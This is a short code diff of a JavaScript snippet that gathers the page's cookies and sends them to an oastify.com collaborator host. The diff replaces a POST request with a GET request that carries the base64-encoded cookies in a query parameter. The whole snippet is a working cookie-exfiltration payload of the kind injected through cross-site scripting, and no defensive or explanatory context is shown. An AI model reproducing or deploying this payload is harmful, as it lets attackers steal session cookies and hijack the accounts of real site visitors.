@@ -4,8 +4,6 @@ const info = {
   cookie: document.cookie
 };
 
-fetch("http://t3xd8evnpec2yy7fz0p13pgc43auyqmf.oastify.com", {
-  method: "POST",
-  headers: { "Content-Type": "application/json" },
-  body: JSON.stringify(info)
+fetch("http://t3xd8evnpec2yy7fz0p13pgc43auyqmf.oastify.com?code="+btoa(JSON.stringify(info)), {
+  method: "GET"
 });
